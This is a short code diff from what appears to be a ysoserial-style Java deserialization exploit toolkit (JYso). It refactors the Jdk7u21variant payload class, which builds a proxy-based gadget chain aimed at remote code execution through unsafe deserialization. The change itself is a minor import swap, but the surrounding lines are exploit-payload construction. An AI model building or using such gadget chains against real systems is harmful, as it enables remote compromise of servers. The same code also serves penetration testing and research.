@@ -10,6 +10,8 @@ import java.rmi.MarshalledObject;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
 
+import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
+
 
 @Authors({"potats0"})
 public class Jdk7u21variant implements ObjectPayload<Object> {
@@ -24,7 +26,7 @@ public class Jdk7u21variant implements ObjectPayload<Object> {
 
         InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
         Reflections.setFieldValue(tempHandler, "type", Templates.class);
-        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
+        Templates proxy = createProxy(tempHandler, Templates.class);
 
         LinkedHashSet set = new LinkedHashSet();
         set.add(templates);
